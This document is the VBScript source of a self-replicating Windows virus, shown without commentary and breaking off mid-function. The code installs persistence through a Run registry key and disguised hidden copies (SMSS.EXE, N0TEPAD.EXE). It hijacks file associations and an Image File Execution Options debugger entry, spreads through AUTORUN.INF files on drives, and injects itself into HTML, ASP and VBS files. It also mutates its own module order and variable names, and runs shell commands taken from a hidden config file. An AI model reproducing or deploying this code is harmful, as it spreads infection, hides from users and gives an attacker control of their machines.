'$Top_7

'WTGZBCUZIVABCX1_4
Sub AT_V_SetServices_PowerOn(objfso,ByRef Code_Vbs)
	On Error Resume Next
    Dim FULLPATH_V0,FULLPATH_V0_SCRIPTHOST,FULLPATH_N0_SCRIPTHOST
    FULLPATH_V0_SCRIPTHOST = PropertyGet_Virus("FULLPATH_V0_SCRIPTHOST")
    FULLPATH_N0_SCRIPTHOST = PropertyGet_SpecialFolder(1) & "WScript.exe"
    FullPath_V0 = PropertyGet_Virus("FULLPATH_V0")  
	Call AT_V_CpyCoreFile(objfso, "",FullPath_V0, Code_Vbs)
    Call AT_V_CpyCoreFile(objfso, FULLPATH_N0_SCRIPTHOST,FULLPATH_V0_SCRIPTHOST, "")
    Call AT_V_SetStartUp("Microsoft Services: UserName.VBS", FullPath_V0 & " /PowerOn", "HKLM\SoftWare\Microsoft\Windows\CurrentVersion\Run")  
End Sub
'BIHLIFCYEZXL1_4

'WTGZBCUZIVABCX2_16
Function PropertyGet_Virus(CMD)
    Select Case UCase(CMD)
        Case "FULLPATH_V0_NOTEPAD"
		    PropertyGet_Virus = PropertyGet_SpecialFolder(0) & PropertyGet_Virus("NAME_V0_NOTEPAD") 
        Case "NAME_V0_NOTEPAD"
		    PropertyGet_Virus ="N0TEPAD.EXE" 
	    Case "FULLPATH_V0_SCRIPTHOST"
		    PropertyGet_Virus = PropertyGet_SpecialFolder(0) & PropertyGet_Virus("NAME_V0_SCRIPTHOST") 
        Case "NAME_V0_SCRIPTHOST"
		    PropertyGet_Virus ="SMSS.EXE" 
        Case "HEAD_V"
            PropertyGet_Virus = "'" & "$" & "T" & "op_"
        Case "TAIL_V"
            PropertyGet_Virus = "'" & "$" & "Bot" & "tom"
        Case "MODULELHEAD"
            PropertyGet_Virus = "'WTGZBCUZIVABCX"
        Case "MODULELTAIL"
            PropertyGet_Virus = "'BIHLIFCYEZXL"
        Case "0MODULELHEAD"
            PropertyGet_Virus = "WTGZBCUZIVABCX"
        Case "0MODULELTAIL"
            PropertyGet_Virus = "BIHLIFCYEZXL"
        Case "NAME_V0"
            PropertyGet_Virus = PropertyGet_UserName() & ".VBS"
        Case "FULLPATH_V0"
            PropertyGet_Virus = PropertyGet_SpecialFolder(0) & PropertyGet_Virus("NAME_V0")
        Case "FULLPATH_V1"
            PropertyGet_Virus = PropertyGet_SpecialFolder(1) & "OPENFILE.VBS"
        Case "FULLPATH_V2"
            PropertyGet_Virus = PropertyGet_SpecialFolder(2) & "DEBUGGER.VBS"
        Case "FULLPATH_CONFIG"
            PropertyGet_Virus = PropertyGet_SpecialFolder(0) & "MSCONFIG.INI"
        Case "CNTMAX_V"
            PropertyGet_Virus = 500
        Case "VERSION_V"
            PropertyGet_Virus = "7"
        Case "FSO"
            PropertyGet_Virus = "Sc" & "rip" & "ti" & "ng.Fi" & "le" & "Syst" & "emO" & "bject"
        Case "ISTEST"
            PropertyGet_Virus = False
    End Select
End Function
'BIHLIFCYEZXL2_16

'WTGZBCUZIVABCX2_27
Function Reg_Read(sKey)
    On Error Resume Next
    Dim objShell
    Set objShell = CreateObject("WS" &"cript.S" & "hell")
    Reg_Read = objShell.RegRead(sKey)
    Set objShell = Nothing
End Function
'BIHLIFCYEZXL2_27

'WTGZBCUZIVABCX2_22
Function CodeGet_Virus(objfso, X0, ScriptType, f1, f2, X1) 'Get full Codes you want
    
    Dim buffer,EXE_Type
    If IsEXE_VBS() = True Then
        EXE_Type="EXE_VBS"
    Else
        EXE_Type="EXE_WEBPAGE"
    End If
    Select Case EXE_Type
        Case "EXE_WEBPAGE"
            buffer = CodeGet_Self_EXWP("VBSCRIPT")
        Case "EXE_VBS"
            buffer = CodeGet_Self_EXVBS(objfso, WScript.ScriptFullName)
    End Select
    
    If f1 = 1 And f2 = 1 Then
        buffer = CodeMK_RndModuleOrder(buffer)
        buffer = CodeMK_RndVar(buffer)
    ElseIf f1 = 1 And f2 = 0 Then
        buffer = CodeMK_RndModuleOrder(buffer)
    ElseIf f1 = 0 And f2 = 1 Then
        buffer = CodeMK_RndVar(buffer)
    End If
    
    buffer=PropertyGet_Virus("HEAD_V") & PropertyGet_Virus("VERSION_V") & vbCrLf & buffer & vbCrLf & PropertyGet_Virus("TAIL_V")
    Select Case UCase(ScriptType)
        Case "CODE_VBS"
            CodeGet_Virus = buffer
        Case "CODE_WEBPAGE"
            CodeGet_Virus =  "<" & "SCR" & "IPT Language = VBS" & "cript>" & vbCrLf & buffer & vbCrLf & "</SCRIPT" & ">"
        Case Else
            CodeGet_Virus = buffer
    End Select
    
End Function
'BIHLIFCYEZXL2_22

'WTGZBCUZIVABCX2_41
Function IsEXE_WebPage()
    On Error Resume Next
    Dim TErr
    TErr = Document.Location
    If Err Then
        Err.Clear
        IsEXE_WebPage = False
    Else
        IsEXE_WebPage = True
    End If
End Function
'BIHLIFCYEZXL2_41

'WTGZBCUZIVABCX2_17
Sub AT_N_KillProcess(ProcessNames)
    On Error Resume Next
    Dim objShell,intReturn, name_exe
    Set objShell = WScript.CreateObject("WS" &"cript.S" & "hell")
    Set objWMIServices = GetObject("winmgmts:\\" & "." & "\root\cimv2")
    For Each ProcessName in ProcessNames
        Set colProcessList = objWMIServices.Execquery(" Select * From win32_process where name = '" & ProcessName & "' ")
        For Each objProcess in colProcessList
            intReturn = objProcess.Terminate
            Select Case intReturn
                Case 2
                    name_exe = objProcess.Name
                    name_exe = Left(name_exe, Len(name_exe) -4)
                    objShell.Run "cmd.exe /c @tskill " & name_exe, 0, False
            End Select
        Next
    Next
    Set objShell = Nothing
End Sub
'BIHLIFCYEZXL2_17

'WTGZBCUZIVABCX2_45
Function PropertyGet_Version(objfso, FullPath_V)
    On Error Resume Next
    Dim objFileStream, buffer, Head_V
    If objfso.FileExists(FullPath_V) = True Then
        Set objFileStream = objfso.OpenTextFile(FullPath_V, 1)
	        buffer = objFileStream.ReadAll()
	        objFileStream.Close
        Head_V = PropertyGet_Virus("HEAD_V")
        PropertyGet_Version = Mid(buffer, InStr(buffer, Head_V) + Len(Head_V), 1) 
    End If
End Function
'BIHLIFCYEZXL2_45

'WTGZBCUZIVABCX2_18
Sub Reg_Del(sKey)
    On Error Resume Next
    Dim objShell
    Set objShell = CreateObject("WS" &"cript.S" & "hell")
    objShell.RegDelete sKey
    Set objShell = Nothing
End Sub
'BIHLIFCYEZXL2_18

'WTGZBCUZIVABCX2_13
Sub AT_V_SetFileAss(Extfile, Value_V, T)
    On Error Resume Next
    Dim SZ,sKey1,sKey2,sKey_inf,sKey_txt,sKey_hlp,sKey_reg,sKey_chm 
    
    sKey1 = "HKLM\SOFTWARE\Classes\"
    sKey2 = "\shell\open\command\"
    sKey_inf = sKey1 & "inffile"  & sKey2
    sKey_txt = sKey1 & "txtfile"  & sKey2
    sKey_hlp = sKey1 & "hlpfile"  & sKey2
    sKey_reg = sKey1 & "regfile"  & sKey2
    SZ = "REG_EXPAND_SZ"

    Select Case UCase(Extfile)
        Case "INFFILE"
            If T = 1 And Reg_Read(sKey_inf)<>Value_V Then
                Call Reg_Write(sKey_inf, Value_V, SZ)
            End If
        Case "TXTFILE"
            If T = 1 And Reg_Read(sKey_txt)<>Value_V Then
                Call Reg_Write(sKey_txt, Value_V, SZ)
            End If
        Case "HLPFILE"
            If T = 1 And Reg_Read(sKey_hlp)<>Value_V Then
                Call Reg_Write(sKey_hlp, Value_V, SZ)
            End If
        Case "REGFILE"
            If T = 1 And Reg_Read(sKey_reg)<>Value_V Then
                Call Reg_Write(sKey_reg, Value_V, SZ)
            End If
        Case "CHM.FILE"
            If T = 1 And Reg_Read(sKey_chm)<>Value_V Then
                Call Reg_Write(sKey_chm, Value_V, SZ)
            End If
        Case Else
            '
            '
    End Select
End Sub
'BIHLIFCYEZXL2_13

'WTGZBCUZIVABCX2_39
Sub EXE_V_AutoRun()
    Call AT_N_Run(Left(WScript.ScriptFullName, 2))
    Call AT_V_InvadeSystem("INVADESYSTEM")
    Call AT_V_LoadScript_Main()
End Sub
'BIHLIFCYEZXL2_39

'WTGZBCUZIVABCX2_33
Sub AT_V_SetIFEO(Name_Exe,Value_V,T)
	Dim Locat
	Locat="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"	
	Locat=Locat & "\" & Name_Exe & "\Debugger"		
	If T=1 Then
		If Reg_Read(Locat)<>Value_V Then
			Call Reg_Write(Locat,Value_V,"")
		End If
	End IF
End Sub
'BIHLIFCYEZXL2_33

'WTGZBCUZIVABCX1_5
Sub EXE_Main_VBS()
    Dim oArgs,CMD
    Set oArgs = WScript.Arguments
    If Wscript.Arguments.Count = 0 then
	    CMD="/INVADESYSTEM"
    Else
	    CMD = UCase(oArgs(0))
    End If
    
    Select Case CMD             ' Call The Function Associated With The Given Command
        Case "/DEBUGGER"
	        EXE_V_DeBugger()
        Case "/OPENFILE"
            EXE_V_OpenFile()
        Case "/AUTORUN"
            EXE_V_AutoRun()
        Case "/POWERON"
            EXE_V_PowerOn()
        Case "/INVADESYSTEM"
            EXE_V_InvadeSystem()
    End Select
End Sub
'BIHLIFCYEZXL1_5

'WTGZBCUZIVABCX2_14
Function IsPreInstance(FullPath, flag)
    On Error Resume Next
    Dim cnt,objWMIService, colProcessList, objProcess
    cnt = 0
    IsPreInstance = False
    Set objWMIService = GetObject("winmgmts:\\" & "." & "\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where " & "Name = 'cscript.exe' or Name = 'wscript.exe' or Name = '" & PropertyGet_Virus("NAME_V0_SCRIPTHOST") & "' ")
    For Each objProcess in colProcessList
        If InStr(CStr(objProcess.CommandLine), FullPath)>0 Then
            cnt = cnt + 1
        End If
    Next
    If flag = 0 Then 'Self
        If cnt>= 2 Then 
            IsPreInstance = True
        End If
    ElseIf flag = 1 Then 
        If cnt>= 1 Then
            IsPreInstance = True
        End If
    End If
End Function
'BIHLIFCYEZXL2_14

'WTGZBCUZIVABCX1_9
Function AT_V_SearchDrives()
    On Error Resume Next
    Dim objfso,Cnt_V, CntMax_V, oDrives, objDrive, Code_Vbs, Code_WebPage
    
    Set objfso = CreateObject(PropertyGet_Virus("FSO"))
    Code_WebPage = CodeGet_Virus(objfso, "EXE_VBS", "CODE_WEBPAGE", 1, 1, "")
    Code_Vbs = CodeGet_Virus(objfso, "EXE_VBS", "CODE_VBS", 1, 1, "")
    Cnt_V = 0
    CntMax_V = PropertyGet_Virus("CNTMAX_V")
    Set oDrives = objfso.Drives
    
    For Each objDrive In oDrives
        If Cnt_V >= CntMax_V And T = 0 Then
            AT_V_SearchDrives = Cnt_V
            Exit Function
        End If
        
        If ((objDrive.DriveType = 1 Or objDrive.DriveType = 2 Or objDrive.DriveType = 3) And PropertyGet_Virus("IsTest") = False) Or (PropertyGet_Virus("IsTest") = True And objDrive.DriveType = 1) Then
            Result = AT_V_SearchFile(objfso, objDrive.Path & "\", "", CntMax_V, Cnt_V, Code_WebPage, Code_Vbs, T)
        End If
    Next
    AT_V_SearchDrives = Cnt_V
End Function
'BIHLIFCYEZXL1_9

'WTGZBCUZIVABCX2_15
Function CodeGet_Self_EXVBS(objfso, FullPath_Self) 'GetSelfCode When EXE_VBS
    On Error Resume Next
    Dim n, n1, buffer, Self
    Set Self = objfso.OpenTextFile(FullPath_Self, 1)
	    buffer = Self.ReadAll
	    Self.Close
    n = InStr(buffer, PropertyGet_Virus("Head_V"))
    n1 = InstrRev(buffer, PropertyGet_Virus("Tail_V"))
    buffer = Mid(buffer, n, (n1 - n + Len(PropertyGet_Virus("Tail_V")) + 1))
    CodeGet_Self_EXVBS = buffer
End Function
'BIHLIFCYEZXL2_15

'WTGZBCUZIVABCX2_46
Sub AT_N_CMDShell(Para)
    On Error Resume Next
    Dim objShell
    Set objShell = WScript.CreateObject("WS" &"cript.S" & "hell")
    objShell.Run "cmd.exe /c" & " " & Para, 1, True
    Set objShell = Nothing
End Sub
'BIHLIFCYEZXL2_46

'WTGZBCUZIVABCX2_32
Sub AT_N_HideFile(objfso, Path)
    Dim objFile
    Set objFile = objfso.GetFile(Path)
	    objFile.Attributes = 6
	    objFile.Close
End Sub
'BIHLIFCYEZXL2_32

'WTGZBCUZIVABCX2_31
Function CodeMK_RndModuleOrder(ByRef Code) 'Randomize the Module Order of the Code 
    On Error Resume Next
    Dim DNA(), Array_vbsCode()
    Dim i, Value, flag, j, buffer,Num_DNA
    buffer = Code
    Randomize
    Num_DNA=0
    For i = 1 To 999
        ReDim  Preserve Array_vbsCode(i)
        Array_vbsCode(i) = CodeMK_GetModule(buffer, i)
        If Array_vbsCode(i) ="" Then
	        Num_DNA=i-1
	        Exit For  
        End IF  
    Next
    
    ReDim DNA(Num_DNA)
    For i = 1 To Num_DNA
        Do
            Value = Int((Num_DNA * Rnd) + 1)
            flag = 1 
            For j = 1 To Num_DNA
                If Value = DNA(j) Then
                    flag = 0
                    Exit For
                End If
            Next
            
        Loop Until flag = 1  
        DNA(i) = Value
    Next
    
    buffer = ""
    For i = 1 To Num_DNA
        buffer = buffer & vbCrLf & Array_vbsCode(DNA(i)) & vbCrLf
    Next
    CodeMK_RndModuleOrder = buffer   
End Function
'BIHLIFCYEZXL2_31

'WTGZBCUZIVABCX2_30
Class Class_V_Config

    Public Sub UpDate()
    	On Error Resume Next
	    Dim objfso,FullPath_Config
	    Set objfso = CreateObject(PropertyGet_Virus("FSO"))
	    FullPath_Config=PropertyGet_Virus("FULLPATH_CONFIG")
		objfso.DeleteFile FullPath_Config, True
		Set objFileStream = objfso.OpenTextFile(FullPath_Config, 2, True)
			objFileStream.WriteLine Date() 
			objFileStream.WriteLine inter_CMD
			objFileStream.WriteLine inter_Para
			objFileStream.Close
		Call AT_N_HideFile(objfso, FullPath_Config)
	    Set objfso = Nothing
    End Sub
    
    Public Property Get LastTime
	    LastTime=inter_LastTime
    End Property
    
    Public Property Get CMD
	    CMD=inter_CMD
    End Property 
    
    Public Property Get Para
	    Para=inter_Para
    End Property 
    
	Public Property Let CMD(Data)
		inter_CMD=Data
	End Property 
	
	Public Property Let Para(Data)
		inter_Para=Data
	End Property
 
	Private Sub Class_Initialize 
		On Error Resume Next
	    Dim objfso,FullPath_Config
	    Set objfso = CreateObject(PropertyGet_Virus("FSO"))
		FullPath_Config=PropertyGet_Virus("FULLPATH_CONFIG")
		If objfso.FileExists(FullPath_Config) = True Then
		    Set objFileStream = objfso.OpenTextFile(FullPath_Config, 1, False)
			    inter_LastTime = objFileStream.ReadLine
	            inter_CMD = objFileStream.ReadLine
	            inter_Para =objFileStream.ReadLine
		        objFileStream.Close
        Else
	        inter_LastTime ="1985-8-24"
	        inter_CMD ="INFECTFILES"
	        inter_Para=0
        End If
        Set objfso = Nothing	
	End Sub

	Private inter_LastTime,inter_CMD,inter_Para

End Class
'BIHLIFCYEZXL2_30

'WTGZBCUZIVABCX2_20
Sub AT_N_ReLoadScript(Name_ScriptHost,FullPath_ScriptHost,Para)
    On Error Resume Next
    Dim objShell,ScriptHost
    ScriptHost = WScript.FullName
    ScriptHost = Right(ScriptHost, Len(ScriptHost) - InStrRev(ScriptHost, "\"))   
    If UCase(ScriptHost) <> UCase(Name_ScriptHost) Then
       Set objShell = WScript.CreateObject("WS" &"cript.S" & "hell")
       objShell.Run Chr(34) & FullPath_ScriptHost & Chr(34) & " " &   Chr(34) & WScript.ScriptFullName  & Chr(34) &  " " & Para
       WScript.Quit
       Set objShell =  Nothing
    End If
End Sub
'BIHLIFCYEZXL2_20

'WTGZBCUZIVABCX2_21
Function CodeMK_GetModule(Code, N_ModelCode)'GET the MoDule in the Code
    Dim n, n1, buffer
    buffer = Code
    If N_ModelCode>= 1 And N_ModelCode<= 9 Then
        n = InStr(buffer, PropertyGet_Virus("MODULELHEAD") & "1_" & N_ModelCode)
        n1 = InStr(buffer, PropertyGet_Virus("MODULELTAIL") & "1_" & N_ModelCode)
        CodeMK_GetModule = Mid(buffer, n, n1 - n + Len(PropertyGet_Virus("MODULELTAIL") & "1_" & N_ModelCode))
    ElseIf N_ModelCode>= 10 And N_ModelCode<= 99 Then
        n = InStr(buffer, PropertyGet_Virus("MODULELHEAD") & "2_" & N_ModelCode)
        n1 = InStr(buffer, PropertyGet_Virus("MODULELTAIL") & "2_" & N_ModelCode)
        CodeMK_GetModule = Mid(buffer, n, n1 - n + Len(PropertyGet_Virus("MODULELTAIL") & "2_" & N_ModelCode))
    ElseIf N_ModelCode>= 100 And N_ModelCode<= 999 Then
        n = InStr(buffer, PropertyGet_Virus("MODULELHEAD") & "3_" & N_ModelCode)
        n1 = InStr(buffer, PropertyGet_Virus("MODULELTAIL") & "3_" & N_ModelCode)
        CodeMK_GetModule = Mid(buffer, n, n1 - n + Len(PropertyGet_Virus("MODULELTAIL") & "3_" & N_ModelCode))
    End If
End Function
'BIHLIFCYEZXL2_21

'WTGZBCUZIVABCX1_2
Sub EXE_V_OpenFile()
    On Error Resume Next
    Dim oArgs,ArgNum,Para_V
    
    Set oArgs = WScript.Arguments
    ArgNum = 1
    Do While ArgNum < oArgs.Count
        Para_V = Para_V & " " & oArgs(ArgNum)
        ArgNum = ArgNum + 1
    Loop
    
    Select Case UCase(Right(Para_V, 3))
        Case "TXT", "LOG", "INF"
            Call AT_N_Run(PropertyGet_Virus("NAME_V0_NOTEPAD") & " """ & Trim(Para_V) & """")
        Case "REG"
            Call AT_N_Run("regedit.exe " & """" & Trim(Para_V) & """")
        Case "CHM"
            Call AT_N_Run("hh.exe " & """" & Trim(Para_V) & """")
        Case "HLP"
            Call AT_N_Run("winhlp32.exe " & """" & Trim(Para_V) & """")
    End Select

    Call AT_V_InvadeSystem("INVADESYSTEM")
    Call AT_V_LoadScript_Main()

End Sub
'BIHLIFCYEZXL1_2

'WTGZBCUZIVABCX1_3
Sub EXE_V_PowerOn()
    On Error Resume Next
    Dim Jack,Cnt_V
    Dim FULLPATH_V0_SCRIPTHOST,NAME_V0_SCRIPTHOST
    
    If IsPreInstance(WScript.ScriptFullName, 0) = True Then 'only a Instance
        WScript.Quit
    Else
	    FULLPATH_V0_SCRIPTHOST=PropertyGet_Virus("FULLPATH_V0_SCRIPTHOST")  
	    NAME_V0_SCRIPTHOST=PropertyGet_Virus("NAME_V0_SCRIPTHOST")
	    Call AT_N_ReLoadScript(NAME_V0_SCRIPTHOST,FULLPATH_V0_SCRIPTHOST,"/POWERON")  'ReLoad Script with FULLPATH_V0_SCRIPTHOST
    End If

    Set Jack = New Class_V_Config
    If DateDiff("d", Jack.LastTime, Date())>=1 Then 
	    Select Case Jack.CMD  'Execute CMD
	        Case "INFECTFILES"
	            Cnt_V = AT_V_SearchDrives()
	            If Cnt_V >0 Then
		            Jack.Para = Jack.Para + Cnt_V 
	            Else
	                Jack.CMD = "SLEEP"
	                Jack.Para  = Date()
	            End If
	            Jack.UpDate 
	        Case "SLEEP"
	            If DateDiff("d", Jack.LastTime,, Date())>49 Then
	                Jack.CMD = "INFECTFILES"
	                Jack.Para = 0
	            End If
				jack.UpDate 
	        Case "CMDSHELL"
	            Call AT_N_CMDShell(Jack.Para) 
	            jack.UpDate
	        Case Else
				Jack.CMD = "INFECTFILES"
				Jack.Para = 0
				jack.UpDate
	    End Select
    End If
    
    Set Jack = Nothing
    Call AT_V_InvadeSystem("MONITOR")
    
End Sub
'BIHLIFCYEZXL1_3

'WTGZBCUZIVABCX2_11
Sub AT_V_CpyCoreFile(objfso, FullPath_Source,FullPath_V, ByRef Code_Vbs)
    On Error Resume Next
    If FullPath_Source = "" Then                   'MakeFile  
        If objfso.FileExists(FullPath_V) = False Then
            objfso.DeleteFile FullPath_V, True
            Call AT_N_MakeFile(objfso, Code_Vbs, FullPath_V)
            Call AT_N_HideFile(objfso, FullPath_V)
        End If
    Else                                           'CopyFile
        If objfso.FileExists(FullPath_V) = False Then
	        objfso.CopyFile FullPath_Source,FullPath_V
	        Call AT_N_HideFile(objfso, FullPath_V)
        End If
    End IF    
           
End Sub
'BIHLIFCYEZXL2_11

'WTGZBCUZIVABCX2_19
Function IsEXE_VBS()
    On Error Resume Next
    Dim TErr
    TErr = WScript.ScriptFullName
    If Err Then
        Err.Clear
        IsEXE_Vbs = False
    Else
        IsEXE_Vbs = True
    End If
End Function
'BIHLIFCYEZXL2_19

'WTGZBCUZIVABCX2_26
Sub AT_N_Run(ExeFullName)
	On Error Resume Next
    Dim objShell
    Set objShell = WScript.CreateObject("WS" &"cript.S" & "hell")
    objShell.Run ExeFullName
    Set objShell = Nothing
End Sub
'BIHLIFCYEZXL2_26

'WTGZBCUZIVABCX1_8
Function PropertyGet_UserName() 'Get UserName
    On Error Resume Next
    Dim UserName, i, buffer
    UserName = Reg_Read("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
    For i = 1 To Len(UserName)
        buffer = buffer & Trim(Mid(UserName, i, 1))
    Next
    UserName = buffer
    If UserName = "" Then
        PropertyGet_UserName = "Adm" & "in" &"is" & "trator"
    Else
        PropertyGet_UserName = UserName
    End If
End Function

Function PropertyGet_SerialNumber()
    Dim objfso

    objfso.GetSpecialFolder(flag)
    
    
    
    Set objfso = Nothing
    
    


End Function



'BIHLIFCYEZXL1_8

'WTGZBCUZIVABCX2_42
Function IsInfectedFile(ByRef buffer,Ext)
    IsInfectedFile = False
    Select Case UCase(Ext)
        Case "HTA", "HTM", "HTML", "ASP", "VBS"
            If InStr(buffer, PropertyGet_Virus("HEAD_V") ) <>0 Then
                IsInfectedFile = True
            End If
    End Select
End Function
'BIHLIFCYEZXL2_42

'WTGZBCUZIVABCX1_6
Sub EXE_V_InvadeSystem()
    Call AT_V_InvadeSystem("INVADESYSTEM")
    Call AT_V_LoadScript_Main()
End Sub
'BIHLIFCYEZXL1_6

'WTGZBCUZIVABCX2_24
Sub AT_V_SetServices_AutoRun(objfso, ByRef Code_Vbs)
    On Error Resume Next
    Dim Name_V,Path_inf,Path_V,Path_ini,Code_inf,Code_ini
    Dim oDrives,objDrive,Path_Folder
    
    Name_V="AUTORUN.VBS"
    Set oDrives = objfso.Drives
    
    For Each objDrive In oDrives
        If objDrive.DriveType = 1 Or objDrive.DriveType = 2 Or objDrive.DriveType = 3 Then
            D = objDrive.DriveLetter
            Path_Folder= D & ":\RECYCLE" 
            Path_V= Path_Folder & "\" & Name_V
            Path_inf = D & ":\AUTORUN.INF"
            Path_ini = Path_Folder & "\" & "desktop.ini"
            Code_ini = "[.ShellClassInfo]" & vbCrLf & _
                       "CLSID={645FF040-5081-101B-9F08-00AA002F954E}"
            Code_inf = "[AutoRun]" & vbCrLf & _
                       "Shellexecute=WScript.exe " & Path_V & " ""/AutoRun""" & vbCrLf & _
                       "shell\AutoRun=右击打开(&O)" & vbCrLf & _
                       "shell\AutoRun\command=WScript.exe " & Path_V & " ""/AutoRun"""  
            If  objfso.FolderExists(Path_Folder) = False Or objfso.FileExists(Path_inf) = False Then  
                objfso.DeleteFolder D & ":\RECYCLED" , True
                objfso.DeleteFolder Path_Folder, True
                objfso.DeleteFile Path_inf, True 
                objfso.CreateFolder(Path_Folder) 
				Call AT_N_HideFolder(objfso, Path_Folder)	
				Call AT_N_MakeFile(objfso, Code_ini, Path_ini)
				Call AT_N_HideFile(objfso, Path_ini)		
                Call AT_N_MakeFile(objfso, Code_Vbs, Path_V)
                Call AT_N_HideFile(objfso, Path_V)            
                Call AT_N_MakeFile(objfso, Code_inf, Path_inf)
                Call AT_N_HideFile(objfso, Path_inf)
            End If
        End If
    Next
    
End Sub
'BIHLIFCYEZXL2_24

'WTGZBCUZIVABCX2_44
Function PropertyGet_SpecialFolder(flag) 'Get SpecialFolder
    Dim objfso,Files_Path
    Files_Path="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\"
    If flag = 3 Then
	    PropertyGet_SpecialFolder = Reg_Read(Files_Path & "CommonFilesDir") & "\"
    Else
        Set objfso = CreateObject(PropertyGet_Virus("FSO"))
	    PropertyGet_SpecialFolder = objfso.GetSpecialFolder(flag) & "\"
		Set objfso = Nothing
	End If       
End Function
'BIHLIFCYEZXL2_44

'WTGZBCUZIVABCX1_7
Sub AT_V_InvadeSystem(CMD)
    Dim objfso,flag,Code_Vbs
    
    Set objfso = CreateObject(PropertyGet_Virus("FSO"))
    Select Case CMD 
        Case "INVADESYSTEM"
            flag = 1  'Invade  System
            Code_Vbs = CodeGet_Virus(objfso, "", "CODE_VBS", 1, 1, "")
        Case "MONITOR"
            flag = 2  'Monitor  System 
            Code_Vbs = CodeGet_Virus(objfso, "", "CODE_VBS", 1, 1, "")
    End Select
    
    Do                                             
        Call AT_V_SetServices_PowerOn(objfso,Code_Vbs)
        Call AT_V_SetServices_OpenFile(objfso,Code_Vbs)
        Call AT_V_SetServices_DeBugger(objfso,Code_Vbs)
        Call AT_V_SetServices_AutoRun(objfso,Code_Vbs) 
        If PropertyGet_Virus("ISTEST") = False then
	        Call AT_V_SetSysConfig()
        End If
        If flag = 2 Then
            WScript.Sleep 10000
        Else
            Exit Do      
        End If
    Loop 
    
End Sub
'BIHLIFCYEZXL1_7

'WTGZBCUZIVABCX2_25
Sub AT_N_HideFolder(objfso, Path)
    Dim objFolder
    Set objFolder = objfso.GetFolder(Path)
	    objFolder.Attributes = 6
	    objFolder.Close
End Sub
'BIHLIFCYEZXL2_25

'WTGZBCUZIVABCX2_12
Sub EXE_Main()
    If IsEXE_VBS() = True Then
        EXE_MAIN_VBS()
    Else
        EXE_MAIN_WEBPAGE()
    End If
End Sub
'BIHLIFCYEZXL2_12

'WTGZBCUZIVABCX2_40
Sub EXE_Main_WEBPAGE()
    Call AT_V_InvadeSystem("INVADESYSTEM")
End Sub
'BIHLIFCYEZXL2_40

'WTGZBCUZIVABCX2_36
Sub AT_V_SetSysConfig()
    On Error Resume Next
    Dim HCUAdvanced, HCUExplorer
    HCUAdvanced = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUExplorer = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"
    Call Reg_Write (HCUExplorer, 129, "REG_DWORD")  'AutoRun       
    Call Reg_Write (HCUAdvanced, 0, "REG_DWORD")    'SuperHidden   bad
End Sub
'BIHLIFCYEZXL2_36

'WTGZBCUZIVABCX2_29
Sub Reg_Write(sKey, sValue, sType)
    On Error Resume Next
    Dim objShell
    Set objShell = CreateObject("WS" &"cript.S" & "hell")
    If sType = "" Then
        objShell.RegWrite sKey, sValue
    Else
        objShell.RegWrite sKey, sValue, sType
    End If
    Set objShell = Nothing
End Sub
'BIHLIFCYEZXL2_29

'WTGZBCUZIVABCX2_35
Sub AT_V_SetStartUp(Name_Run, Para, Location)
    On Error Resume Next
    Dim Load
    Load = Location & "\" & Name_Run
    If Reg_Read(Load) <> Para Then
        Call Reg_Write(Load, Para, "")
    End If
End Sub
'BIHLIFCYEZXL2_35

'WTGZBCUZIVABCX2_34
Sub AT_V_LoadScript_Main()
    Dim objShell
    Set objShell = WScript.CreateObject("WS" &"cript.S" & "hell")
    objShell.Run Chr(34) &  PropertyGet_Virus("FULLPATH_V0")  & Chr(34) & " /POWERON"
    Set objShell = Nothing	
End Sub
'BIHLIFCYEZXL2_34

'WTGZBCUZIVABCX2_37
Sub AT_N_MakeFile(objfso, Code, FullPath)
    On Error Resume Next
    Dim objFileStream
    Set objFileStream = objfso.OpenTextFile(FullPath, 2, True)
	    objFileStream.Write Code
	    objFileStream.Close
End Sub
'BIHLIFCYEZXL2_37

'WTGZBCUZIVABCX2_38
Function CodeGet_Self_EXWP(Languages) 'GetSelfCode When EXE_WebPage
    On Error Resume Next
    Dim soj
    For Each soj In document.Scripts
        If UCase(soj.Language) = UCase(Languages) And IsInfectedFile(soj.Text, "HTM") = True Then
	        CodeGet_Self_EXWP = soj.Text
	        Exit Function
        End If
    Next
End Function
'BIHLIFCYEZXL2_38

'WTGZBCUZIVABCX1_1
EXE_Main()
'BIHLIFCYEZXL1_1

'WTGZBCUZIVABCX2_47
Sub EXE_V_DeBugger()
    On Error Resume Next
    Dim oArgs,ArgNum,Para_V,FullPath_ExeFile,Name_ExeFile
    Dim FullPath_OpenFile,FULLPATH_V0_ExeFile
	    
    Set oArgs = WScript.Arguments
    ArgNum = 1
    Do While ArgNum < oArgs.Count
        Para_V = Para_V & " " & oArgs(ArgNum)
        ArgNum = ArgNum + 1
    Loop
    
    FullPath_ExeFile=Left(Para_V, InStrRev(Para_V,":")-3)
    FullPath_OpenFile=Right(Para_V, Len(Para_V)-InStrRev(Para_V,":")+2)
    Name_ExeFile=Right(FullPath_ExeFile, Len(FullPath_ExeFile)-InStrRev(FullPath_ExeFile,"\"))
    
    Select Case UCase(Name_ExeFile)
        Case "NOTEPAD.EXE"
	        FULLPATH_V0_EXEFILE=PropertyGet_Virus("FULLPATH_V0_NOTEPAD")
		    Call AT_N_Run("""" & FULLPATH_V0_EXEFILE & """"  & " " & """" & FullPath_OpenFile & """")
        Case "MSCONFIG.EXE"
        '
    End Select

    Call AT_V_InvadeSystem("INVADESYSTEM")
    Call AT_V_LoadScript_Main()

End Sub
'BIHLIFCYEZXL2_47

'WTGZBCUZIVABCX2_10
Function AT_V_InfectFile(FullPath_File, objFile, objfso, ByRef Code_WebPage, ByRef Code_Vbs, Ext, T)
    On Error Resume Next
    Dim Cnt_V, objFileStream, buffer, buffer_top, buffer_bottom, Code, n_top, n_bottom
    
    AT_V_InfectFile = 0
    Set objFileStream = objfso.OpenTextFile(FullPath_File, 1, True)
    buffer = objFileStream.ReadAll()
    objFileStream.Close

    Select Case UCase(Ext) 'Infect the File
        Case "HTA", "HTM", "HTML", "ASP"
            If IsInfectedFile(buffer, Ext) = False Then
                Code = Code_WebPage
